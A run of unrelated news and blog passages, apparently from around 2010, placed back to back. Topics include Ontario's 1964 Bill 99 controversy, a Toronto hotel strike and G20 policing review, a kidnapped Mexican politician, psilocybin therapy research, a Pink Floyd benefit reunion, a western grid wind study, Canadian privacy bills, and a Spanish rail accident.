Diefenbaker , who as prime minister had legislated a national Bill of Rights four years earlier , contemplated denouncing the police state overtones of Bill 99 in the House of Commons , but kept silent out of respect for Robarts .
Diefenbaker urged the premier to drop the bill , as its passage would allow the federal Liberal government a rare opportunity to disallow provincial legislation and make the public view them as the defenders of civil rights … in short , the Liberals would have made Tories at both levels of government look bad .
The bill took on international dimensions when Joseph T. Thorson , a recently retired legal official who served as the honorary president of the International Commission of Jurists , sought to obtain a copy of the legislation to submit to the commission ’s headquarters in Geneva for consideration .
Thorson was outraged by the proposals , which he found worthy of a third - world dictatorship ( he picked on everyone ’s favourite target , the increasingly repressive government of Kwame Nkrumah in Ghana ) .
He told the Globe and Mail that “ they contravene the basic rule of law .
They offend the very sense of justice . ”
As outrage grew , Thorson felt that the public ’s anger showed “ the value of always being on alert . ”
Outside Queen ’s Park , between sixty and one hundred protesters from the Ontario College of Art chanted “ If it starts , where will it end ? ” and “ We want Robarts ! ”
The premier met with three protesters , then stepped in front of the crowd and repeated an earlier statement that no law infringing civil liberties would pass .
While there were some jeers , most of the crowd cheered Robarts with cries of “ Thatta boy ! ”
Those who spoke out in favour of section 14 were few and mostly tied to the OPC .
Defenders stressed that only those involved in organized crime had anything to worry about .
Judge Macdonald believed the legislation was necessary to battle the bad guys — ” What ’s the point of individual rights when there is an invisible government operating behind the scenes , ” he told police officials gathered at the Royal York Hotel .
Among legal experts , University of Toronto law professor John Willis thought the dangers most lawyers described were the result of imaginations gone wild .
He told the Star that “ any attempt by a public authority to deal with social menace necessarily involves interference to some extent with so - called civil liberties of individuals . ”
Headline , the Toronto Star , March 24 , 1964 .
All camps spent the weekend trying to figure out their next moves .
Oliver threatened to launch a filibuster if the bill moved to second reading in its current state .
Robarts met with his advisors , but resisted their calls to force Cass to resign .
The premier announced that he would carefully examine the bill before clarifying or withdrawing the offensive sections .
Newspapers continued to publish editorials wondering where the government ’s judgment and common sense wandered off to .
Public fury extended to local pulpits , as Reverend J.F. Chidsey of the Don Heights Unitarian Congregation read to worshippers a letter that blasted the legislation for destroying freedoms that citizens had gone to war to protect .
The Telegram noted that seventy - five members of the congregation signed the letter , which was addressed to the premier and joined the chorus of people looking for Cass ’s head .
The March 23 session of the Ontario legislature was a raucous affair .
For the first half of the day , debate went back and forth between cabinet members asking for more time to review Bill 99 and the opposition demanding its withdrawal .
In the face of constant attacks from the opposition and his party , Robarts took full responsibility for the fiasco , yet stubbornly clung onto preserving the offending sections of the bill until a committee could review them .
Tory MPPs threatened to resign .
A motion from Oliver to kill the entire bill was defeated .
NDP leader Donald MacDonald moved an amendment to change section 14 only .
Robarts plead for discussion in committee , to which Oliver retorted “ I do n’t think you ’re in any position to preserve even a shred of it . ”
Verbal jousting continued until Robarts finally indicated he would instruct the reviewing committee to delete section 14 as long as it was fully discussed .
MacDonald ’s motion passed the house with approval from all ninety - six MPPs in attendance .
It was the first time a premier had accepted an opposition amendment since George Drew voted for a Labor - Progressive motion asking the government not to contest the principle of family allowances in court in 1944 .
But where was Cass ?
The attorney general maintained a low profile after his initial encounters with the press , as he sat out most of the action at Queen ’s Park .
Cass and his wife secluded themselves at the Royal York as they awaited his fate …
After MacDonald ’s motion passed , an ashen Robarts pulled out Cass ’s resignation letter and read it to the legislature in a strained voice .
Cass defended the bill , but acknowledged that he “ unintentionally touched upon the sensibilities of our people .
In doing this , however , I was answering the dictates of my own conscience . ”
Cartoon by Al Beaton , the Telegram , March 25 , 1964 .
Within days , Arthur Wishart was named as the new attorney general .
Bill 99 was sent to the Legal Bills Committee and rewritten to include common law protections of individual rights .
The bill was brought back to the legislature and passed on April 28 .
Robarts realized he could , as biographer A.K. McDougall described , “ no longer be just a relaxed chairman of the board , ” and took time to review all legislative proposals before they were introduced .
Robarts and Wishart looked into creating new legislation that would redeem the government in the eyes of the public by strengthening civil liberties , which led to the creation of the Ontario Royal Commission on Civil Rights .
Chair James McRuer ’s recommendations , which included limits on powers of arrest , search and seizure , and provided compensation for crime victims , were implemented by Robarts ’s successor William Davis in a series of bills in 1971 .

TORONTO ( PAI ) – President Barack Obama and other international leaders arriving for their June 26 - 27 summit here may encounter something they did n’t expect : a picket line .
That ’s because unless Unite Here Local 75 and the owners of the Canadian metropolis ’ convention hotels reach settlement before the summit starts , the union could use the opportunity to garner publicity for the way its members have been mistreated .
Obama and other leaders of the G - 20 industrialized nations will meet in Canada ’s largest city to discuss , among other things , the impact on workers of the continuing global recession .
Earlier this year , the G - 20 labor ministers drafted a set of recommendations on helping workers cope with the crash .
One recommendation , U.S. Labor Secretary Hilda Solis said then , implicitly backs the right to organize , though not in those words .
There will also be a “ people ’s summit ” to counter the G - 20 in the Toronto area – and massive security downtown , which is where the convention hotels are located .
The 32 Toronto hotels facing the strike employ 5,500 workers combined , who overwhelmingly gave Local 75 a strike authorization vote on June 3 , Unite Here said .
“ Many of us are immigrants , women and workers of color and we have fought hard to lift ourselves out of poverty .
Yet the hotels are trying to undo all that by continuing to cut hours and service levels as if they ’re still in deep recession , which they are n’t , ” said Local 75 Vice President Cicely Phillips , a room attendant at one of the hotels , the Fairmont Royal York .
“ These global giants are reporting profitable years in 2010 and into the future .
As the people who make these hotels work , we want to share in that economic recovery .
We refuse to have the hotels ‘ lock in the recession ’ for workers , ” Phillips stated .
Local 75 says many hotels shortened shifts , introduced split shifts ( a breakfast shift and dinner shift with no pay in between ) , brought in “ beck and call ” hyper - flexible scheduling and increased the use of part - timers , costing workers income and benefits .
The Toronto Sheraton established a “ fake green choice ” program , which “ purports to help guests save the environment but is really intended to reduce housekeeping services and room attendants , ” the local added .
“ How can you get a second job or raise a family in dignity and security with these types of draconian measures ? ” asked Phillips .
While the confrontation in Toronto may greet world leaders , it is only the latest in a string of strikes Unite Here locals have been forced to stage against major chains :
* On June 10 , workers and allies staged a mass protest at Hyatt ’s first - ever public shareholders ’ meeting , in Chicago .
Just days before , several hundred Unite Here members had to walk out of the Hyatt Regency Chicago , the chain ’s flagship .
Another forced strike in Chicago , against the Congress Plaza , just passed its seventh anniversary .
Conditions there are so bad that the hotel gives travelers deep discounts .
* One former housekeeper at the Hyatt in Boston held proxy ballots and got into the chain ’s Chicago shareholders ’ meeting .
Hyatt fired all 100 unionized workers in Boston last Aug. 31 and replaced them with contracted - out minimum wage workers .
“ For 21 years , I gave my body – everything I have – to that hotel , and Hyatt kicked us to the curb , ” said Lucine Williams , who worked at the Hyatt Regency Boston .
“ You profess to be such a great company , but look at how you treat your workers , ” she said .
* Other protests were at Hyatts in Vancouver , Honolulu , San Francisco and Los Angeles .
“ Protesters are outraged at how the company is trying to make the recession permanent for workers despite significantly improving industry conditions and Hyatt ’s rising share values , ” the international union said .
* Hyatt workers in San Francisco staged a three - day strike , June 8 - 10 , protesting working conditions .
It was the fifth time that intransigence by nine hotel owners forced Unite Here Local 2 members to walk out .
The last contract , covering 9,000 workers in San Francisco and San Mateo , Calif . , ran out around a year ago .
The local announced a boycott , too .
It listed seven , including a Hilton , a Westin and two Hyatts , over management demands for cuts .
And it listed Le Meridien and Hyatt Fisherman ’s Wharf “ because their workers demand the right to choose whether or not to form a union without any intimidation from management . ”
Local 2 rep Riddi Mehta told the SF Bay Guardian : “ We ’re not launching a boycott of San Francisco .
We ’ve moved $ 7 million out of boycotted hotels and the majority of the money has stayed in San Francisco . ”

MEXICO CITY ( Reuters ) - A major figure in Mexican President Felipe Calderon ’s conservative party was missing and feared dead on Saturday after his abandoned car was found with signs of violence , the attorney general ’s office said .
Conservative Presidential Candidate of National Action Party ( PAN ) Diego Fernandez de Cevallos makes a point during an address to his supporters at a rally , formally closing his campaign in Mexico City August 13
Diego Fernandez de Cevallos , 69 , an outspoken lawyer who was a presidential candidate for Calderon ’s National Action Party , or PAN , in the 1990s and has been an influential lawmaker , disappeared late on Friday , local officials said .
His car was discovered near his ranch in the central state of Queretaro with some of his personal belongings inside and blood on a pair of scissors thrown on the ground nearby , Queretaro state public prosecutor Arsenio Duran told local radio .
Some Mexican media reported that Fernandez de Cevallos , often dubbed “ Jefe Diego ” ( Chief Diego ) in Mexico , was dead but federal and local officials could not confirm that .
Known for his cigar chomping and fiery style , Fernandez de Cevallos has been a key figure in the PAN both before and since it came to power for the first time in 2000 , ending seven decades of one - party rule in Mexico .
Calderon lamented his disappearance , calling him a “ key politician in Mexico ’s democratic transition . ”
Fernandez de Cevallos lost the 1994 presidential election to the Institutional Revolutionary Party , or PRI , which clung onto power for one more term .
During the race he aggressively attacked the PRI for its all - controlling grip on power .
Calderon , headed to Madrid and Washington for official visits , called Fernandez de Cevallos ’ son personally to say the government was doing everything possible to locate him .
KIDNAPPING COMMON
Kidnapping of corporate executives , public officials and ordinary citizens is rife in Mexico , which is in the grip of a deadly fight against drug traffickers and organized crime gangs .
Drug gang violence has killed some 23,000 people since Calderon ’s term began in December 2006 .
Officials did not say if drug gangs were involved in Fernandez de Cevallos ’ disappearance .
Separately on Saturday , gunmen burst into a bar in the northern city of Torreon in the early hours of the morning killing at least six people and wounding a dozen others .
Local officials said the victims had no known links to drug gangs .
Calderon ’s strategy of deploying thousands of soldiers and federal police to crush drug gangs has failed to curb cartel violence , and escalating turf wars have created spiraling bloodshed , particularly near the U.S. border .
The president defended his clampdown in an interview with Reuters on Thursday .
A handful of local politicians , gearing up for elections in several states , have been killed in recent weeks .
A recent spate of abductions in Mexico ’s oil industry has also rattled that industry .
The province ’s special investigations unit has begun probing five allegations that police caused serious injury to civilians during the summit .
It is unclear whether civilian or police information led to the investigation , with more details promised Wednesday .
“ We ’re currently looking into details surrounding those interactions ” and speaking with witnesses , SIU spokesperson Monica Hudon said Tuesday .
She would not say which police force or forces , of many drawn into G20 security , are involved in the allegations .
The SIU can probe only the officers who work in Ontario , Hudon said , which includes municipal forces and the OPP but not the RCMP .
On the same day , a Toronto police services board meeting calling for an independent civilian review of the way G20 security was handled drew heated response from many people who came to vent about their treatment during the summit .
Thinking their voices would be heard at Tuesday ’s hastily called special session at police headquarters , many shouted their objections after board chair Alok Mukherjee announced his recommendation that an impartial civilian overseer be chosen to conduct the review .
The chair said those in the rowdy gathering had “ no automatic right to speak ” at this venue , and that complaints should be filed in the form of written deputations .
Tuesday ’s meeting came surprisingly soon after vice - chair Pam McConnell suggested a “ cooling off ” period last week .
Other members , as well as Chief Bill Blair , said they felt more time was needed before a summit post - mortem should be conducted .
Board members agreed just two days after the summit closed that discussion of a civilian review should begin “ with a proposal for a process for the board to exercise its civilian oversight responsibilities ” by the next monthly meeting .
The speeded - up process means an independent reviewer will be chosen in time for that July 22 meeting , at which time the board will also hear complaints from citizens who have filed written deputations .
It was clear , however , that many people aggrieved by what happened during the summit are impatient to be heard sooner .
“ This is a public meeting and I think I have the right to speak , as others do as well .
I ’m talking about transparency and accountability that starts right here , ” said John Sewell , who heads up the Toronto Police Accountability coalition .
Others who packed the meeting began heckling as Mukherjee and fellow board members tried to explain this meeting was to announce the framework of the review and that the forum would come later after deputations from the public were received by the board .
Blair , Mukherjee and other board members left the meeting without pausing to answer reporters ’ questions , as they often do following board meetings .
City Councillor and board member Adam Vaughan did , however , stay to explain the slow and complex process of the review .
“ It ’s been a very tumultuous time in the city , and we all need to afford each other patience and an opportunity to proceed fairly .
I recognize , for some people , the need to speak is immediate and urgent , ” he said .
“ The issue is the terms of reference we presented publicly .
The public will have a chance to weigh in on those terms of reference and to assess their strengths and weaknesses and give us recommendations and then we ’ll make a decision on them as a board , ” Vaughan said .
The recommendations state that the independent reviewer will have about 12 weeks to complete the review , with the power to question board and police policy and analyze all police actions relating to G20 security .
“ It ’s certainly a step in the right direction , ” said Nathalie Des Rosiers , counsel general with the Canadian Civil Liberties Association , an organization that attended yesterday ’s police board meeting .
“ The mandate ( of the review ) must give access to files not only within the Toronto police but , if possible , access to the security - protected files and the information that was obtained from CSIS ( Canadian Security Intelligence Service ) .
We do n’t know if it is possible , but it should certainly be looked at . ”
Des Rosiers said anyone who feels he or she was mistreated by police during the G20 summit has the right to lodge a complaint .
Written deputations must be received no later than five working days before the July 22 police board meeting .
It must be signed and contain a presentation outline , with each individual ’s or group ’s presentation limited to five minutes .
The presentations will be videotaped as part of the regular board meeting .
Deputations can be emailed to the attention of the Toronto Police Board Administrator at board@tpsb.ca , or deirdre.williams@tpsb.ca , or mailed to the TPSB Administrator at 40 College St. , Toronto , M5G 2J3 , or dropped off at the front desk of Toronto Police Headquarters at that address .
The big white pill was brought to her in an earthenware chalice .
She ’d already held hands with her two therapists and expressed her wishes for what it would help her do .
She swallowed it , lay on the couch with her eyes covered , and waited .
And then it came .
“ The world was made up of jewels and I was in a dome , ” she recalled .
Surrounded by brilliant , kaleidoscopic colors , she saw the dome open up to admit “ this most incredible luminescence that made everything even more beautiful . ”
ADVERTISEMENT
Tears trickled down her face as she saw “ how beautiful the world could actually be . ”
That ’s how Nicky Edlich , 67 , began her first - ever trip on a psychedelic drug last year .
She says it has greatly helped her psychotherapeutic treatment for anxiety from her advanced ovarian cancer .
And for researchers , it was another small step toward showing that hallucinogenic drugs , famous but condemned in the 1960s , can one day help doctors treat conditions like cancer anxiety and post - traumatic stress disorder .
The New York University study Edlich participated in is among a handful now going on in the United States and elsewhere with drugs like LSD , MDMA ( Ecstasy ) and psilocybin , the main ingredient of “ magic mushrooms . ”
The work follows lines of research choked off four decades ago by the war on drugs .
The research is still preliminary .
But at least it ’s there .
ADVERTISEMENT
“ There is now more psychedelic research taking place in the world than at any time in the last 40 years , ” said Rick Doblin , executive director of the Multidisciplinary Association for Psychedelic Studies , which funds some of the work .
“ We ’re at the end of the beginning of the renaissance . ”
He said that more than 1,200 people attended a conference in California last weekend on psychedelic science .
But doing the research is not easy , Doblin and others say , with government funders still leery and drug companies not interested in the compounds they can’t patent .
That pretty much leaves private donors .
ADVERTISEMENT
“ There ’s still a lot of resistance to it , ” said David Nichols , a Purdue University professor of medicinal chemistry and president of the Heffter Institute , which is supporting the NYU study .
“ The whole hippie thing in the 60s ” and media coverage at the time “ has kind of left a bad taste in the mouth of the public at large .
“ When you tell people you ’re treating people with psychedelics , the first thing that comes to mind is Day - Glo art and tie - dyed shirts . ”
ADVERTISEMENT
Nothing like that was in evidence the other day when Edlich revisited the room at NYU where she ’d taken psilocybin .
Landscape photos and abstract art hung on the walls , flowers and a bowl of fruit adorned a table near the window .
At the foot of the couch lay an Oriental rug .
“ The whole idea was to create a living room - like setting ” that would be relaxing , said study leader Dr. Stephen Ross .
Edlich , whose cancer forced her to retire from teaching French at a private school , had plenty of reason to seek help through the NYU project .
Several recurrences of her ovarian cancer had provoked fears about suffering and dying and how her death would affect her family .
She felt “ profound sadness that my life was going to be cut short . ”
And she faced existential questions :
Why live ?
What does it all mean ?
How can I go on ?
ADVERTISEMENT
“ These things were in my head and I wanted them to take a back seat to living in the moment , ” she said .
So when she heard NYU researchers speak about the project at her cancer support group , she was interested .
Psilocybin has been shown to invoke powerful spiritual experiences during the four to six hours it affects the brain .
A study published in 2008 , in fact , found that even 14 months after healthy volunteers had taken a single dose , most said they were still feeling and behaving better because of the experience .
They also said the drug had produced one of the five most spiritually significant experiences they ’d ever had .
Experts emphasize people should n’t try psilocybin on their own because it can be harmful , sometimes causing bouts of anxiety and paranoia .
The NYU study is testing whether that drug experience can help with the nine months of psychotherapy each participant also gets .
ADVERTISEMENT
The therapy seeks to help patients live fuller , richer lives with the time they have left .
Each study participant gets two drug - dose experiences , but only one of those involves psilocybin ; the other is a placebo dose of niacin , which makes the face flush .
The homey NYU room where Edlich had been getting psychotherapy was the setting for her drug experiences .
She had brought along photos of her son , grandchildren and partner .
She met with two therapists she ’d come to trust , knowing they would stay with her through her hours under the influence .
Taking the drug followed a ritual , including the chalice and the hand - holding , because ritual has been part of psilocybin ’s successful use for centuries by traditional cultures , said Ross , the lead researcher .
ADVERTISEMENT
After swallowing the white pill , Edlich perused an art book for about a half - hour while waiting for the psilocybin to take effect .
Then she lay on the couch with headphones and listened to music with eyeshades over her eyes .
After her vision of the brilliantly colored dome , Edlich went on to two more experiences involving parts of her life .
She wo n’t describe those much , even to friends .
They “ brought me profound sadness and profound grief ” but also transformed her understanding of what was important to her in the areas of relationships and trusting , she says .
She sat up and talked with her psychotherapists about what had gone on .
And after nine hours in that room , she went home and wrote 30 pages in a diary about what had happened .
And she thought about it for weeks afterward .
Did the drug experience help ?
It let her view the issues she was working on through a different lens , she said .
“ I think it made me more aware of what was so important and what was making me either sad or depressed .
I think it was revelatory . ”
ADVERTISEMENT
All three people in the study so far felt better , with less general anxiety and fear of death , and greater acceptance of the dying process , Ross said .
No major side effects have appeared .
The project plans to enroll a total of 32 people .
Ross ’ work follows up on a small study at the University of California , Los Angeles ; results have n’t been published yet , but they too are encouraging , according to experts familiar with it .
Yet another study of psilocybin for cancer anxiety , at Johns Hopkins University , has treated 11 out of a planned 44 participants so far .
Chief investigator Roland Griffiths said he suspected the results would fall in line with the UCLA work .
In interviews , some psychiatrists who work with cancer patients reacted coolly to the prospects of using psilocybin .
ADVERTISEMENT
“ I ’m kind of curious about it , ” said Dr. Susan Block of the Dana - Farber Cancer Institute in Boston .
She said it ’s an open question how helpful the drug experiences could be , and “ I do n’t think it ’s ever going to be a widely used treatment . ”
Ross , meanwhile , thinks patients might benefit from more than one dose of the drug during the psychotherapy .
The study permits only one dose , but all three participants asked for a second , he said .
Edlich said her single dose “ brought me to a deeper place in my mind , that I would never have gone to … I feel a second session would even take me to more important places .
“ I would do it a second time in a New York minute . ”

Something rather unexpected happened Saturday July , 10th : in a bolt out of the blue , David Gilmour and Roger Waters performed together for the Hoping Foundation Benefit Evening !
Guy Pratt performed bass duties whilst Roger was on acoustic guitar , with Roger playing bass at other points during the evening ’s performance .
For those of you surprised by Guy ’s inclusion , some of you will recall from our Guy Pratt interview back in 2005 , Guy was asked to play bass for Pink Floyd at Live8 when the reunion happened …
We now know that the show took place – not in London , as noted by Getty Images – but at the rather splendid Kiddington Hall , in Oxfordshire .
News of the show , and the appearance by David and Roger , was broken by one of the hosts of the evening , TV presenter Fearne Cotton , who tweeted about the event in the early hours of this morning .
There ’s a number of pictures from the performance , and the evening itself , over at Getty Images …
This evening , more details emerged courtesy of David ’s blog – the tracks performed were : To Know Him Is To Love Him , Wish You Were Here , Comfortably Numb , and Another Brick in the Wall ( Part 2 ) …
The band consisted of David , Roger , Guy Pratt ( bass and acoustic guitar ) , Harry Waters ( keyboards ) , Andy Newmark ( drums ) , Chester Kamen ( guitar ) and Jonjo Grisdale ( keyboards ) .
Quite a line - up , who performed in front of 200 very lucky people , raising some £ 350,000 for the Hoping Foundation ( Hope and Optimism for Palestinians In the Next Generation ) in the process .
*courtesy of braindamage.co.uk
As we reported earlier , Roger Waters will be performing The Wall LIVE in its entirety .
Now I do n’t want to speculate or get anyone ’s hopes up , but could it be that the two have finally decided to put their differences behind them and start making music again ???
We can only hope … but damn if this happens , it could go down as one of the greatest moments in rock and roll history !!
UPDATE : According to Roger Waters ’ facebook page , a possible surprise show on The Wall Tour is not out of the question !!!
Some weeks passed with David cajoling me from time to time , telling me how easy it would be , but I clung resolutely to my fear of failure until one day he made one final entreaty .
I quote “ If you do ‘ To Know Him Is To Love Him ’ for The Hoping Foundation Gig , I ’ll come and do ‘ C. Numb ’ on one of your Wall shows ” .
Well !
You could have knocked me down with a feather .
How fucking cool !
I was blown away .
How could I refuse such an offer .
I could n’t , there was no way .
Generosity trumped fear .
And so explaining that I would probably be shite , but if he did n’t mind I did n’t , I agreed and the rest is history .
We did it , and it was fucking great .
End of story .
Or possibly beginning .
Roger PS .
Just heard from David , he will decide in due course which gig he wants to do , it will be a surprise !

The Department of Energy ’s National Renewable Energy Lab ( NREL ) asserts in a study released last month that the power grid for five western states – Arizona , Colorado , Nevada , New Mexico and Wyoming – the WestConnect territory – could operate on as much as 30 percent wind and 5 percent solar without the construction of extensive new infrastructure .
The wind is packed with kinetic energy – molecules in motion that can be used to make other molecules move such as commonly seen windmill water pumps , or used to compress gas and converted into electricity .
When it blows .
When the wind is becalmed , there is n’t any energy other than the latent heat .
When the NREL made its assertion one had to read the study .
Dr. Debra Lew , project manager for the study , said in her statement , “ If key changes can be made to standard operating procedures , our research shows that large amounts of wind and solar can be incorporated onto the grid without a lot of backup generation . ”
The situation now has it that large coal , natural gas or nuclear plants would always need to stand ready to provide backup power whenever the wind ceased to blow or clouds blocked the sun .
The NREL scientists looked at that supposition head on and found that ‘ stand ready ’ would be largely baseless when the parameters were optimized .
It concluded that in the West , a broad distribution of wind turbines and solar generation would essentially smooth out the supply of renewable power .
Lew explained simply , “ When you coordinate the operations between utilities across a large geographic area , you decrease the effect of the variability of wind and solar energy sources , mitigating the unpredictability of Mother Nature . ”
Called ‘ The Western Wind and Solar Integration Study ” it examines the benefits and challenges of integrating enough wind and solar energy capacity into the grid to produce 35 percent of its electricity by 2017 .
The study finds that this target is technically feasible and does not necessitate extensive additional infrastructure , but does require key changes to current operational practice .
The results offer a first look at the issue of adding significant amount of variable renewable energy in the West and will help utilities across the region plan how to ramp up their production of renewable energy as they incorporate more wind and solar energy plants into the power grid .

The technical analysis performed in the study shows that it is operationally possible to accommodate 30 percent wind and 5 percent solar energy penetration .
To accomplish such an increase , utilities will have to substantially increase their coordination of operations over wider geographic areas and schedule their generation deliveries , or sales , on a more frequent basis .
Currently generators provide a schedule for a specific amount of power they will provide in the next hour .
More frequent scheduling would allow generators to adjust that amount of power based on changes in system conditions such as increases or decreases in wind or solar generation .
Being a government animal the NREL looks at the policy issues rather than the costs to the ratepayers .
But one can infer some significant fuel costs will be taken out from the calculation when the study says integrating wind as suggested “ would also decrease fuel and emissions costs by 40 percent . ”
That assertion deserves some testing considering the governments record in making predictions .
The study suggests the results would come with other benefits .
Existing transmission capacity can be more fully utilized to reduce the amount of new transmission that needs to be built .
Coordinating the operations of utilities to facilitate the integration of wind and solar energy can provide substantial savings by reducing the need for additional back - up generation , such as instant on natural gas - burning plants .
And the fly in the thinking is that use of wind and solar forecasts in utility operations to predict when and where it will be windy and sunny is essential for cost - effectively integrating these renewable energy sources .
Yet the meteorologists are getting quite good when only looking hours out .
When one looks at a map of the territory involved it does n’t seem farfetched at all .
While not using the deep resources of the Midwest or the Northwest the five states when combined for managing intermittency do have what looks like a solid 35 percent or better power resource potential .
Event though the study is from a government agency , the study was undertaken by a team of wind , solar and power systems experts across both the private and public sectors .
It ’s a long list of contributors .
The work is mainly an operations study , rather than a transmission study , although different scenarios model different transmission build - outs to deliver power .
Using a detailed power system production simulation model , the study identifies operational impacts and challenges of wind energy penetration up to 30 % of annual electricity consumption .
The NREL page links to the pdf as well as the earlier Eastern Wind Integration and Transmissions study page with a pdf link to the 17.8 MB download .
Many thoughtful people discount wind for valid reasons .
But the fact remains the energy in moving air is significant and one way to overcome the intermittency issue without having massive electron storage is to well , get organized .
Getting organized and planning things out over a big resource base has great potential that must n’t be overlooked .

Activist Shane Dillon who was seized by Israeli authorities in a commando operation which left at least 10 people dead on an aid flotilla is being sent back to Ireland .
Six other Irish campaigners - including Dr Fintan Lane and Fiachra O Luain - are being detained in the Be'er Sheva detention camp , where they face deportation .
The three named activists were on board Free Gaza boat Challenger 1 which was boarded by Israeli forces in international waters as it travelled from Cyprus .
Nobel peace prizewinner Mairead Maguire remains on board the Irish - owned vessel MV Rachel Corrie , which the Israeli navy is preparing to stop .
Irish Foreign Affairs Minister Micheal Martin , who maintains that the Irish citizens were kidnapped , confirmed the Irish ambassador in Tel Aviv was finally given permission to meet Mr Dillon at Ben Gurion Airport before his departure .
The ambassador and officers from the Irish Embassy in Tel Aviv are also due to visit the detained Irish citizens .
" I will continue to press for full consular access being allowed , as is provided for under international law , " said Mr Martin .
" I will be reporting to the Government later this morning on my meeting yesterday with the Israeli ambassador and on the measures which my department is taking to secure the immediate and unconditional release of those Irish citizens detained by Israel . "
The UN Security Council has also called for the immediate release of all the ships and citizens detained by the Israeli authorities .
Mr Martin said he had made it clear to Israeli Ambassador Dr Zion Evrony that the Irish Government expects the immediate and unconditional release of all the Irish citizens detained .
" The seven individuals concerned did not enter Israel illegally ; rather they were essentially seized from international waters , taken into Israel and asked to sign documents confirming that they entered illegally .
This is simply not acceptable , " he said .

Last week Industry Minister Tony Clement unveiled two bills touted as important components of the government 's national digital strategy .
The Fighting Internet and Wireless Spam
Act is a repeat of the anti-spam bill that passed through the House of Commons last year but died after Parliament prorogued .
Since the new bill reflects roughly the same compromise that garnered all - party support , it should receive swift passage .

She ’s covered education , youth and housing issues for a decade now , and we ’re lucky to have her .
The second bill , the Safeguarding Canadians ' Personal Information Act , is likely to be far more controversial .
The bill amends Canada 's existing privacy legislation by establishing new exceptions for businesses and new powers for law enforcement .
The centrepiece is a long overdue security breach disclosure requirement .
Over the past seven years , virtually every U.S. state has enacted disclosure rules that compel organizations that suffer a security breach that places personal information at risk to promptly disclose that fact to the affected individuals .
By mandating notification , the laws ensure that individuals are better able to guard against identity theft by closely monitoring their credit card bills , bank accounts , and credit reports for any unusual activity .
From a business perspective , the laws create a strong incentive to protect personal information since the notification process is both expensive and embarrassing .
Moreover , the laws have persuaded some organizations to rethink the amount of personal information they retain , since mounting data collection and retention increases the damaging consequences of a security breach .
What bill will require of businesses
The Canadian proposal establishes two requirements .
First , businesses are required to report a " material breach of security safeguards involving personal information under its control " to the Privacy Commissioner .
The business determines whether the breach meets this standard by assessing the sensitivity of the information , the number of individuals affected , and whether there is a systemic security problem .
Second , businesses are required to notify individuals affected by the breach " if it is reasonable in the circumstances to believe that the breach creates a real risk of significant harm to the individual . "
The business makes its own determination of whether there is a real risk by considering the sensitivity of the information and the probability that the personal information will be misused .
While the bill is better than the current situation where there is no security breach disclosure requirement , it falls far short of the rules found elsewhere .
The government 's proposal sets a very high threshold for disclosure of a breach and contains no clear penalties for non-disclosure .
By comparison , the California law establishes a threshold of whether an unauthorized person acquired the information , not whether there is real risk of significant harm ( other states merely require harm , not significant harm ) .
Moreover , the California law requires disclosure in the most expedient time possible and without unreasonable delay -- far quicker than the Canadian plan .
Some states also establish tough penalties for failure to promptly notify .
For example , Florida 's law provides for penalties of up to US $ 500,000 for failure to notify affected individuals and up to US $ 50,000 for failure to document non-notifications of security breaches .
Needed : penalties
Security breach disclosure was widely recognized as a major hole in the Canadian law framework , yet this proposal is a disappointment that falls short of striking the right balance between protecting Canadians , encouraging appropriate safeguards of personal information , and guarding against overwhelming Canadians with too many notices .
In fact , with no penalties for failure to notify security breaches , the provisions may do more harm than good .
If it becomes law , Canadians will expect to receive notifications in the event of a breach , but companies may err on the side of not notifying , safe in the knowledge that there are no established financial penalties for failing to do so .
A high - speed train passing through a Spanish railway station has hit a group of young people crossing the tracks , killing at least 12 people .
The train was travelling through Castelldefels Playa station near Barcelona when the incident occurred .
At least 14 other people were injured , three critically , officials said .
It is believed they were heading to the beach to celebrate a summer festival and were crossing the tracks rather than using a pedestrian underpass .
They had just arrived on a commuter train from Barcelona .
The authorities have said the underpass was signposted and open .
Some witnesses said it was crowded and taking a long time for people to get through .
' Brutal '
One witness , Fernando Ortega , told Spanish media the platform they had arrived on was " very full " and a large group of people " decided to jump across the tracks and cross to the other side of the station " to avoid the crush .
The euphoria of getting off the train immediately became screams Marcelo Cardona , Eye- witness
" At that moment a train came from the other direction and ran everyone over . "
Another witness , who was not named , said : " The door was closed and we could not get through , so we tried to go through the side of the train , and there was no light and nobody alerted us that the train was coming .
We were more than 30 people . "
Several people contacted the BBC News website to say that they had used the same station and it was common for people to cross the tracks .
Jordi Morell said : " The underpass is quite small and it has been the usual practice for crowded trains coming from Barcelona , to have at least a third of the passengers crossing the line .
" Even at my age ( early 60 s ) I have got down from the platform and crossed the line rather than wait for the slow queue through the underpass . "
' Blood everywhere '
Many of the victims were heading to the beach for the annual San Juan festivities , which celebrates one of the year 's shortest nights with bonfires , fireworks and dancing .
Marcelo Cardona , a Bolivian who was on the commuter train , said the youths had crossed " in a wave " but that he had held back and waited on the platform .
" The euphoria of getting off the train immediately became screams .
There were people screaming , ' my daughter , my sister ' , " he told the Associated Press .
Mr Cardona said he saw " mutilated people , blood everywhere , blood on the platform " .
The owner of a nearby supermarket described the impact between the train and the pedestrians as " brutal " .
" The noise was like rocks being crushed , " he told El Mundo .
Spain 's interior minister Alfredo Perez Rubalcaba said : " We 're shocked .
It 's horrible .
The only thing we can do at the moment is send a message of solidarity to the families of those who died and wish that those who are injured will recover as soon as possible . "
The accident happened at around 2330 local time ( 2130 GMT ) , the interior ministry of Catalonia said .
The ministry added that the rail line was closed and teams of police , medical staff , firefighters and Red Cross workers were at the scene .
No -one on the high - speed train , travelling between Alicante and Barcelona , was hurt .
Although the identities of the victims are not yet known , the president of the government of Catalonia said there were " many of South American origin " .
The accident was Spain 's worst rail accident since 2003 , when 19 people were killed when two trains collided near the central town of Chinchilla .
There has been no claim of responsibility for the bombings .
But an al - Shabaab commander in Mogadishu praised the attacks .
He admitted he did not know whether they were the work of his group , which is fighting to overthrow the Somali government .
What happens as foreign housing bubbles become worse than ours ?
The American housing bubble is far greater than any on record for the last 120 years .
What if property values in many other advanced economies are far more manic than ours ?
It means you should plan for a global economic catastrophe .
Put that in your pipe and smoke it .
ONE day life was good .
All it took was concealer for my under - eye circles , a swoosh of bronzer , and I was out the door .
I wore no foundation , and I had no qualms .
Then the Temptu airbrush makeup system came into my life .
Sort of like a gun that blows a mist of foundation , it promised to make my skin flawless .
According to its manufacturer , it had made the faces of the “ Stepford Wives ” look porcelain smooth ( if creepily perfect ) in the 2004 remake , and it routinely makes movie stars and television anchors ready for high - definition close - ups .
What did I have to lose but my rosy chin ?
Let ’s just say they do n’t call it Tempt -u for nothing .
That little black box and misting makeup shooter are addictive , especially for overachievers who ca n’t resist striving for perfect skin .
